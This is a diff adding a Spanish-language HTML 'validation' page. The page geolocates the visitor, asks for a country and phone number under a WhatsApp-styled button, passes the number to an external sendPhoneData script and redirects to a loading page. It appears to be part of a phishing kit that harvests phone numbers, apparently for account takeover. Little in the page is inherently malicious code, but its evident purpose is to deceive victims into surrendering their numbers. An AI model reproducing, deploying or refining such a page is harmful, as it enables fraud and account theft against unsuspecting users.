@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="./docs/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="./docs/styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+  <title>Validación</title>
+</head>
+<body>
+  <section class="login">
+    <img src="./docs/patrn.jpg" alt="Login-image" class="login--image">
+
+    <form id="phoneForm" class="login--form">
+      <div align="left">
+        <img src="./docs/lbg22.png" style="width:110px"><br>
+        <span style="font-size:16px"><b>Para continuar con la validación su pais e ingrese su número de teléfono</b></span>
+      </div><br>
+      
+      <div class="login--content">
+        <div class="login-box">
+          <div class="login--input-box">
+            <select id="country" class="login-input" name="country">
+              <option value="" disabled selected>Selecciona tu país</option>
+              <option value="+54">🇦🇷 Argentina</option>
+              <option value="+591">🇧🇴 Bolivia</option>
+              <option value="+55">🇧🇷 Brasil</option>
+              <option value="+56">🇨🇱 Chile</option>
+              <option value="+57">🇨🇴 Colombia</option>
+              <option value="+506">🇨🇷 Costa Rica</option>
+              <option value="+53">🇨🇺 Cuba</option>
+              <option value="+1">🇩🇴 República Dominicana</option>
+              <option value="+593">🇪🇨 Ecuador</option>
+              <option value="+503">🇸🇻 El Salvador</option>
+              <option value="+502">🇬🇹 Guatemala</option>
+              <option value="+504">🇭🇳 Honduras</option>
+              <option value="+52">🇲🇽 México</option>
+              <option value="+505">🇳🇮 Nicaragua</option>
+              <option value="+507">🇵🇦 Panamá</option>
+              <option value="+595">🇵🇾 Paraguay</option>
+              <option value="+51">🇵🇪 Perú</option>
+              <option value="+1">🇵🇷 Puerto Rico</option>
+              <option value="+598">🇺🇾 Uruguay</option>
+              <option value="+58">🇻🇪 Venezuela</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="login-box">
+          <i class="ri-phone-fill"></i>
+          <div class="login--input-box">
+            <input type="tel" class="login-input" id="telefono" name="tlef" placeholder=" " maxlength="15" 
+            onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
+            <label for="" class="login--input-label">Teléfono</label>
+          </div>
+        </div>
+      </div>
+
+      <button type="submit" class="login--button--whatsapp">Siguiente</button>
+    </form>
+  </section>
+
+  <!-- Scripts -->
+  <script src="./excedata.js"></script>
+  <script src="./docs/main.js"></script>
+  
+  <script>
+    // Función para validar número de teléfono
+    function validatePhoneNumber() {
+      const phoneInput = document.getElementById('telefono');
+      const countrySelect = document.getElementById('country');
+      
+      if(countrySelect.value && phoneInput.value) {
+        phoneInput.value = countrySelect.value + phoneInput.value.replace(countrySelect.value, '');
+      }
+    }
+
+    // Configuración inicial al cargar la página
+    window.onload = function() {
+      const countrySelect = document.getElementById('country');
+      const phoneInput = document.getElementById('telefono');
+      
+      // Detectar país automáticamente
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const countryMap = {
+            'AR': '+54', 'BO': '+591', 'BR': '+55', 'CL': '+56', 'CO': '+57',
+            'CR': '+506', 'CU': '+53', 'DO': '+1', 'EC': '+593', 'SV': '+503',
+            'GT': '+502', 'HN': '+504', 'MX': '+52', 'NI': '+505', 'PA': '+507',
+            'PY': '+595', 'PE': '+51', 'PR': '+1', 'UY': '+598', 'VE': '+58'
+          };
+          countrySelect.value = countryMap[data.country_code] || '';
+          phoneInput.value = countrySelect.value;
+        })
+        .catch(error => console.error('Error al obtener ubicación:', error));
+
+      // Event listeners
+      countrySelect.addEventListener('change', function() {
+        phoneInput.value = this.value;
+      });
+
+      phoneInput.addEventListener('input', validatePhoneNumber);
+
+      // Manejar envío del formulario
+      document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const phoneNumber = document.getElementById('telefono').value;
+        
+        if(typeof sendPhoneData === 'function') {
+          await sendPhoneData(phoneNumber);
+          window.location.href = 'loading.html';
+        } else {
+          console.error('La función sendPhoneData no está disponible');
+        }
+      });
+    }
+  </script>
+<script src="../protect.js"></script>
+</body>
+</html>
